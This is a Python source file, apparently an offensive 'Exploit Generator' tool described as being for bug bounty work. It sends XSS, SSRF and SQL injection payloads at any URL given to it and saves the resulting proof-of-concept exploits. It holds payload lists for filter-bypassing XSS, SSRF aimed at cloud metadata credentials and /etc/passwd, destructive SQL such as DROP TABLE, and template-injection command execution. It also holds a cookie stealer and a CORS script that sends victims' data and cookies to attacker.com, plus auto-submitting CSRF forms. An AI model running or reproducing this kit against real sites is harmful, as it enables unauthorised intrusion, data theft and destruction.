#!/usr/bin/env python3
"""
Exploit Generator v1.0 - PoC Payload Generator for Bug Bounty
Generates working proof-of-concept exploits for discovered vulnerabilities

Vulnerability Types:
1. XSS (Reflected, Stored, DOM) - Multiple bypass techniques
2. SSRF - Various protocols and bypass methods
3. SQL Injection - Error, blind, time-based payloads
4. SSTI - Multiple template engines
5. Open Redirect - Various bypass techniques
6. CORS - Exploitation scripts
7. CSRF - HTML forms and fetch scripts
8. Path Traversal - Multiple encoding bypasses
9. Prototype Pollution - JavaScript payloads
10. Cache Poisoning - Full PoC

Author: Security Research Team
"""

import requests
import re
import json
import sys
import os
import base64
import html
from urllib.parse import urljoin, urlparse, quote, unquote, urlencode
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
import urllib3
urllib3.disable_warnings()


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    END = "\033[0m"


@dataclass
class Exploit:
    vuln_type: str
    title: str
    payload: str
    full_url: str
    poc_code: str
    steps: List[str]
    impact: str
    remediation: str


class ExploitGenerator:
    """
    Generates PoC exploits for various vulnerability types
    """

    def __init__(self, target: str, output_dir: str = "."):
        self.target = target.rstrip('/')
        self.output_dir = output_dir
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.session.verify = False
        self.exploits: List[Exploit] = []

    def log(self, level: str, msg: str):
        colors = {'info': Colors.BLUE, 'success': Colors.GREEN,
                  'warning': Colors.YELLOW, 'exploit': Colors.PURPLE}
        color = colors.get(level, '')
        print(f"{color}[{level.upper()}]{Colors.END} {msg}")

    # ==================== XSS PAYLOADS ====================

    def generate_xss_payloads(self, param: str = "q", context: str = "html") -> List[Dict]:
        """Generate XSS payloads for different contexts"""
        payloads = []

        # Basic payloads
        basic = [
            '<script>alert(document.domain)</script>',
            '<img src=x onerror=alert(document.domain)>',
            '<svg onload=alert(document.domain)>',
            '"><script>alert(document.domain)</script>',
            "'-alert(document.domain)-'",
            '<body onload=alert(document.domain)>',
        ]

        # Filter bypass payloads
        bypass = [
            '<ScRiPt>alert(document.domain)</sCrIpT>',
            '<img src=x onerror="alert(document.domain)">',
            '<svg/onload=alert(document.domain)>',
            '<img src=x onerror=alert`document.domain`>',
            '<<script>script>alert(document.domain)</script>',
            '<scr<script>ipt>alert(document.domain)</scr</script>ipt>',
            '<img src=x onerror=eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))>',
            '<svg><script>alert&#40;document.domain&#41;</script>',
            '<a href="javascript:alert(document.domain)">click</a>',
            '<iframe srcdoc="<script>alert(parent.document.domain)</script>">',
        ]

        # Encoding bypasses
        encoded = [
            '%3Cscript%3Ealert(document.domain)%3C/script%3E',
            '&#60;script&#62;alert(document.domain)&#60;/script&#62;',
            '\\x3cscript\\x3ealert(document.domain)\\x3c/script\\x3e',
            '\\u003cscript\\u003ealert(document.domain)\\u003c/script\\u003e',
        ]

        # DOM-based payloads
        dom = [
            '#<script>alert(document.domain)</script>',
            '?q=<script>alert(document.domain)</script>',
            'javascript:alert(document.domain)',
            'data:text/html,<script>alert(document.domain)</script>',
        ]

        # Context-specific
        if context == 'attribute':
            payloads.extend([
                '" onmouseover="alert(document.domain)" x="',
                "' onmouseover='alert(document.domain)' x='",
                '" onfocus="alert(document.domain)" autofocus="',
                'javascript:alert(document.domain)',
            ])
        elif context == 'javascript':
            payloads.extend([
                "';alert(document.domain);//",
                '";alert(document.domain);//',
                '</script><script>alert(document.domain)</script>',
                '${alert(document.domain)}',
            ])
        elif context == 'url':
            payloads.extend([
                'javascript:alert(document.domain)',
                'data:text/html,<script>alert(document.domain)</script>',
                '//evil.com/xss.js',
            ])
        else:
            payloads.extend(basic + bypass)

        return [{'payload': p, 'encoded': quote(p)} for p in payloads]

    def generate_xss_poc(self, url: str, param: str, payload: str) -> Exploit:
        """Generate full XSS PoC"""
        full_url = f"{url}?{param}={quote(payload)}"

        poc_html = f'''<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC - {self.target}</title>
</head>
<body>
    <h1>XSS Proof of Concept</h1>
    <p>Target: {self.target}</p>
    <p>Parameter: {param}</p>

    <h2>Method 1: Direct Link</h2>
    <a href="{html.escape(full_url)}" target="_blank">Click to trigger XSS</a>

    <h2>Method 2: Auto-trigger (iframe)</h2>
    <iframe src="{html.escape(full_url)}" width="800" height="400"></iframe>

    <h2>Method 3: Fetch (for Stored XSS exfiltration)</h2>
    <script>
    // Cookie stealer payload
    var payload = `<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">`;
    console.log("Use this payload for cookie stealing:", payload);
    </script>

    <h2>Raw Payload</h2>
    <pre>{html.escape(payload)}</pre>
</body>
</html>'''

        return Exploit(
            vuln_type='XSS',
            title=f'Cross-Site Scripting in {param} parameter',
            payload=payload,
            full_url=full_url,
            poc_code=poc_html,
            steps=[
                f'1. Navigate to: {full_url}',
                '2. Observe JavaScript alert showing document.domain',
                '3. This confirms arbitrary JavaScript execution in victim\'s browser',
            ],
            impact='Attacker can steal cookies, session tokens, or perform actions as the victim',
            remediation='Implement proper output encoding and Content-Security-Policy headers'
        )

    # ==================== SSRF PAYLOADS ====================

    def generate_ssrf_payloads(self) -> List[Dict]:
        """Generate SSRF payloads"""
        payloads = []

        # Internal network
        internal = [
            'http://127.0.0.1',
            'http://localhost',
            'http://0.0.0.0',
            'http://[::1]',
            'http://127.0.0.1:80',
            'http://127.0.0.1:443',
            'http://127.0.0.1:8080',
            'http://127.0.0.1:3000',
            'http://192.168.0.1',
            'http://192.168.1.1',
            'http://10.0.0.1',
            'http://172.16.0.1',
        ]

        # Cloud metadata
        cloud = [
            'http://169.254.169.254/latest/meta-data/',  # AWS
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://metadata.google.internal/computeMetadata/v1/',  # GCP
            'http://169.254.169.254/metadata/v1/',  # DigitalOcean
            'http://169.254.169.254/metadata/instance',  # Azure
        ]

        # Bypass techniques
        bypass = [
            'http://127.1',
            'http://0177.0.0.1',  # Octal
            'http://0x7f.0.0.1',  # Hex
            'http://2130706433',  # Decimal
            'http://127.0.0.1.nip.io',
            'http://localtest.me',
            'http://127.0.0.1:80@evil.com',
            'http://evil.com#@127.0.0.1',
            'http://127。0。0。1',  # Unicode dots
            'http://①②⑦.0.0.1',  # Unicode numbers
        ]

        # Protocol handlers
        protocols = [
            'file:///etc/passwd',
            'file:///c:/windows/system32/drivers/etc/hosts',
            'dict://127.0.0.1:11211/stats',
            'gopher://127.0.0.1:6379/_INFO',
            'ftp://127.0.0.1/',
        ]

        for p in internal + cloud + bypass + protocols:
            payloads.append({'payload': p, 'type': 'ssrf'})

        return payloads

    def generate_ssrf_poc(self, url: str, param: str, target_url: str) -> Exploit:
        """Generate SSRF PoC"""
        full_url = f"{url}?{param}={quote(target_url)}"

        poc_script = f'''#!/bin/bash
# SSRF Proof of Concept
# Target: {self.target}
# Parameter: {param}

echo "[*] Testing SSRF vulnerability..."

# Test 1: AWS Metadata (if running on AWS)
echo "[*] Attempting AWS metadata access..."
curl -s "{url}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Test 2: Internal services
echo "[*] Scanning internal services..."
for port in 80 443 8080 3000 5000 6379 11211; do
    curl -s -o /dev/null -w "%{{http_code}}" "{url}?{param}=http://127.0.0.1:$port"
    echo " - Port $port"
done

# Test 3: Read local files (if file:// is allowed)
echo "[*] Attempting file read..."
curl -s "{url}?{param}=file:///etc/passwd"

echo "[*] SSRF testing complete"
'''

        return Exploit(
            vuln_type='SSRF',
            title=f'Server-Side Request Forgery via {param}',
            payload=target_url,
            full_url=full_url,
            poc_code=poc_script,
            steps=[
                f'1. Send request to: {full_url}',
                '2. Observe that internal resource is accessed',
                '3. For AWS: Try accessing IAM credentials at metadata endpoint',
            ],
            impact='Access to internal services, cloud credentials, and sensitive data',
            remediation='Whitelist allowed URLs/domains, block internal IP ranges'
        )

    # ==================== SQL INJECTION PAYLOADS ====================

    def generate_sqli_payloads(self) -> List[Dict]:
        """Generate SQL injection payloads"""
        payloads = []

        # Error-based
        error = [
            "'",
            "''",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' ORDER BY 1--",
            "1' ORDER BY 100--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1; DROP TABLE users--",
        ]

        # Time-based blind
        time_based = [
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR pg_sleep(5)--",
            "1' AND SLEEP(5)--",
            "1'; SELECT SLEEP(5)--",
        ]

        # Boolean-based blind
        boolean = [
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND 1=1--",
            "' AND 1=2--",
            "1 AND 1=1",
            "1 AND 1=2",
        ]

        # UNION-based
        union = [
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT 1,@@version,3--",
            "' UNION SELECT username,password FROM users--",
        ]

        for p in error + time_based + boolean + union:
            payloads.append({'payload': p, 'type': 'sqli'})

        return payloads

    def generate_sqli_poc(self, url: str, param: str, payload: str) -> Exploit:
        """Generate SQLi PoC"""
        full_url = f"{url}?{param}={quote(payload)}"

        poc_script = f'''#!/usr/bin/env python3
# SQL Injection PoC
# Target: {self.target}

import requests

url = "{url}"
param = "{param}"

# Step 1: Confirm vulnerability
print("[*] Testing SQL injection...")
payloads = [
    "' OR '1'='1",
    "' AND '1'='2",
]

for p in payloads:
    r = requests.get(url, params={{param: p}})
    print(f"Payload: {{p}} -> Status: {{r.status_code}}, Length: {{len(r.text)}}")

# Step 2: Determine number of columns
print("\\n[*] Finding column count...")
for i in range(1, 10):
    p = "' ORDER BY " + str(i) + "--"
    r = requests.get(url, params={{param: p}})
    if r.status_code != 200 or "error" in r.text.lower():
        print(f"Column count: {{i-1}}")
        break

# Step 3: Extract data (example)
print("\\n[*] Attempting data extraction...")
union_payload = "' UNION SELECT NULL,@@version,NULL--"
r = requests.get(url, params={{param: union_payload}})
print(f"Response: {{r.text[:500]}}")

# Step 4: Use SQLMap for full exploitation
print("\\n[*] For full exploitation, use:")
print(f"sqlmap -u '{url}?{param}=1' --dbs")
'''

        return Exploit(
            vuln_type='SQLi',
            title=f'SQL Injection in {param} parameter',
            payload=payload,
            full_url=full_url,
            poc_code=poc_script,
            steps=[
                f'1. Send payload: {payload}',
                '2. Observe SQL error or behavioral difference',
                '3. Use UNION-based or time-based techniques to extract data',
                f'4. Run: sqlmap -u \'{url}?{param}=1\' --dbs',
            ],
            impact='Full database access, data theft, potential RCE',
            remediation='Use parameterized queries/prepared statements'
        )

    # ==================== SSTI PAYLOADS ====================

    def generate_ssti_payloads(self) -> List[Dict]:
        """Generate SSTI payloads for various engines"""
        payloads = []

        # Detection
        detection = [
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '#{7*7}',
            '*{7*7}',
            '@(7*7)',
            '{{7*\'7\'}}',
        ]

        # Jinja2 (Python)
        jinja2 = [
            '{{config}}',
            '{{self.__class__.__mro__}}',
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.__mro__[1].__subclasses__()[400]('id',shell=True,stdout=-1).communicate()}}",
            '{{lipsum.__globals__["os"].popen("id").read()}}',
        ]

        # Twig (PHP)
        twig = [
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
            '{{["id"]|filter("system")}}',
        ]

        # Freemarker (Java)
        freemarker = [
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            '${product.getClass().getProtectionDomain().getCodeSource().getLocation()}',
        ]

        for p in detection + jinja2 + twig + freemarker:
            payloads.append({'payload': p, 'type': 'ssti'})

        return payloads

    # ==================== OPEN REDIRECT PAYLOADS ====================

    def generate_redirect_payloads(self, target_domain: str = "evil.com") -> List[Dict]:
        """Generate open redirect payloads"""
        payloads = [
            f'https://{target_domain}',
            f'//{target_domain}',
            f'///{target_domain}',
            f'////{target_domain}',
            f'\\\\{target_domain}',
            f'/\\{target_domain}',
            f'\\.{target_domain}',
            f'https://{target_domain}%2f%2f',
            f'https://{target_domain}%09',
            f'https://{target_domain}%00',
            f'//google.com%2f@{target_domain}',
            f'https://google.com#{target_domain}',
            f'https://{target_domain}@google.com',
            f'//{target_domain}%2f%2e%2e',
            f'///google.com@{target_domain}',
            f'javascript://google.com%0a%0dalert(1)//{target_domain}',
            f'/https://{target_domain}',
            f'/.{target_domain}',
        ]
        return [{'payload': p, 'type': 'redirect'} for p in payloads]

    # ==================== CORS EXPLOITATION ====================

    def generate_cors_poc(self, target_url: str) -> Exploit:
        """Generate CORS exploitation PoC"""
        poc_html = f'''<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploitation PoC</title>
</head>
<body>
    <h1>CORS Vulnerability Exploitation</h1>
    <p>Target: {target_url}</p>
    <div id="result">Loading...</div>

    <script>
    // CORS exploitation - steal data from vulnerable endpoint
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '{target_url}', true);
    xhr.withCredentials = true; // Include cookies
    xhr.onreadystatechange = function() {{
        if (xhr.readyState === 4) {{
            // Send stolen data to attacker server
            document.getElementById('result').innerHTML = '<pre>' + xhr.responseText + '</pre>';

            // Exfiltrate to attacker
            fetch('https://attacker.com/steal', {{
                method: 'POST',
                body: JSON.stringify({{
                    url: '{target_url}',
                    data: xhr.responseText,
                    cookies: document.cookie
                }})
            }});
        }}
    }};
    xhr.send();
    </script>
</body>
</html>'''

        return Exploit(
            vuln_type='CORS',
            title='CORS Misconfiguration Exploitation',
            payload='Origin: https://evil.com',
            full_url=target_url,
            poc_code=poc_html,
            steps=[
                '1. Host this HTML on attacker-controlled domain',
                '2. Trick victim to visit the attacker page',
                '3. JavaScript makes cross-origin request with credentials',
                '4. Response data is exfiltrated to attacker',
            ],
            impact='Theft of sensitive user data, session hijacking',
            remediation='Validate Origin header, avoid reflecting origin, use whitelist'
        )

    # ==================== CSRF EXPLOITATION ====================

    def generate_csrf_poc(self, target_url: str, method: str = "POST",
                          params: Dict = None) -> Exploit:
        """Generate CSRF exploitation PoC"""
        params = params or {'action': 'delete', 'id': '1'}

        if method.upper() == 'GET':
            param_str = urlencode(params)
            poc_html = f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<img src="{target_url}?{param_str}" style="display:none">
<p>CSRF attack executed!</p>
</body>
</html>'''
        else:
            inputs = '\n'.join([f'<input type="hidden" name="{k}" value="{v}">'
                               for k, v in params.items()])
            poc_html = f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<form id="csrf" action="{target_url}" method="POST">
{inputs}
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>'''

        return Exploit(
            vuln_type='CSRF',
            title='Cross-Site Request Forgery',
            payload=str(params),
            full_url=target_url,
            poc_code=poc_html,
            steps=[
                '1. Host this HTML file on attacker domain',
                '2. Send link to authenticated victim',
                '3. Form auto-submits, executing action as victim',
            ],
            impact='Attacker can perform actions on behalf of victim',
            remediation='Implement CSRF tokens, validate Referer/Origin headers'
        )

    # ==================== PROTOTYPE POLLUTION ====================

    def generate_prototype_pollution_payloads(self) -> List[Dict]:
        """Generate prototype pollution payloads"""
        payloads = [
            {"__proto__": {"polluted": "true"}},
            {"constructor": {"prototype": {"polluted": "true"}}},
            {"__proto__": {"isAdmin": True}},
            {"__proto__": {"role": "admin"}},
            {"__proto__": {"status": 200}},
            {"constructor": {"prototype": {"isAuthenticated": True}}},
        ]
        return [{'payload': json.dumps(p), 'type': 'prototype_pollution'} for p in payloads]

    # ==================== MAIN GENERATION ====================

    def generate_all_payloads(self, vuln_type: str, url: str, param: str = "q") -> List[Exploit]:
        """Generate all payloads for a vulnerability type"""
        exploits = []

        if vuln_type.lower() == 'xss':
            payloads = self.generate_xss_payloads(param)
            for p in payloads[:5]:
                exploits.append(self.generate_xss_poc(url, param, p['payload']))

        elif vuln_type.lower() == 'ssrf':
            payloads = self.generate_ssrf_payloads()
            for p in payloads[:5]:
                exploits.append(self.generate_ssrf_poc(url, param, p['payload']))

        elif vuln_type.lower() == 'sqli':
            payloads = self.generate_sqli_payloads()
            for p in payloads[:5]:
                exploits.append(self.generate_sqli_poc(url, param, p['payload']))

        elif vuln_type.lower() == 'cors':
            exploits.append(self.generate_cors_poc(url))

        elif vuln_type.lower() == 'csrf':
            exploits.append(self.generate_csrf_poc(url))

        return exploits

    def test_and_generate(self, url: str, param: str = "q"):
        """Test for vulnerabilities and generate working PoCs"""
        print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"{Colors.PURPLE}   EXPLOIT GENERATOR v1.0{Colors.END}")
        print(f"{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"Target: {url}")
        print(f"Parameter: {param}")
        print()

        working_exploits = []

        # Test XSS
        self.log('info', 'Testing XSS...')
        xss_payloads = self.generate_xss_payloads(param)
        for p in xss_payloads[:10]:
            try:
                test_url = f"{url}?{param}={p['encoded']}"
                resp = self.session.get(test_url, timeout=10)
                if p['payload'] in resp.text:
                    self.log('exploit', f'XSS confirmed: {p["payload"][:50]}...')
                    working_exploits.append(self.generate_xss_poc(url, param, p['payload']))
                    break
            except:
                pass

        # Test SSRF
        self.log('info', 'Testing SSRF...')
        ssrf_payloads = self.generate_ssrf_payloads()
        for p in ssrf_payloads[:5]:
            try:
                test_url = f"{url}?{param}={quote(p['payload'])}"
                resp = self.session.get(test_url, timeout=10)
                if resp.status_code == 200 and len(resp.text) > 50:
                    self.log('exploit', f'Potential SSRF: {p["payload"]}')
                    working_exploits.append(self.generate_ssrf_poc(url, param, p['payload']))
                    break
            except:
                pass

        # Test SQLi
        self.log('info', 'Testing SQLi...')
        sqli_payloads = self.generate_sqli_payloads()
        for p in sqli_payloads[:5]:
            try:
                test_url = f"{url}?{param}={quote(p['payload'])}"
                resp = self.session.get(test_url, timeout=10)
                error_patterns = ['sql', 'mysql', 'sqlite', 'postgresql', 'oracle', 'syntax error']
                if any(err in resp.text.lower() for err in error_patterns):
                    self.log('exploit', f'SQLi confirmed: {p["payload"][:50]}...')
                    working_exploits.append(self.generate_sqli_poc(url, param, p['payload']))
                    break
            except:
                pass

        # Save exploits
        self._save_exploits(working_exploits)

        return working_exploits

    def _save_exploits(self, exploits: List[Exploit]):
        """Save generated exploits to files"""
        if not exploits:
            self.log('warning', 'No working exploits found')
            return

        report_dir = os.path.join(self.output_dir, 'exploits')
        os.makedirs(report_dir, exist_ok=True)

        for i, exp in enumerate(exploits):
            # Save PoC code
            ext = '.html' if 'html' in exp.poc_code.lower() else '.py' if 'python' in exp.poc_code.lower() else '.sh'
            poc_file = os.path.join(report_dir, f'{exp.vuln_type.lower()}_poc_{i}{ext}')
            with open(poc_file, 'w') as f:
                f.write(exp.poc_code)
            self.log('success', f'Saved: {poc_file}')

        # Save summary
        summary = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'exploits': [
                {
                    'type': e.vuln_type,
                    'title': e.title,
                    'payload': e.payload,
                    'full_url': e.full_url,
                    'steps': e.steps,
                    'impact': e.impact,
                }
                for e in exploits
            ]
        }

        summary_file = os.path.join(report_dir, 'exploit_summary.json')
        with open(summary_file, 'w') as f:
            json.dump(summary, f, indent=2)
        self.log('success', f'Summary saved: {summary_file}')


def main():
    if len(sys.argv) < 2:
        print("Usage: python exploit_generator.py <url> [param] [vuln_type]")
        print("\nExamples:")
        print("  python exploit_generator.py https://example.com/search q")
        print("  python exploit_generator.py https://example.com/api/fetch url ssrf")
        print("\nVuln types: xss, ssrf, sqli, ssti, cors, csrf, redirect")
        sys.exit(1)

    url = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else "q"
    vuln_type = sys.argv[3] if len(sys.argv) > 3 else None

    generator = ExploitGenerator(url)

    if vuln_type:
        exploits = generator.generate_all_payloads(vuln_type, url, param)
        generator._save_exploits(exploits)
    else:
        generator.test_and_generate(url, param)


if __name__ == "__main__":
    main()
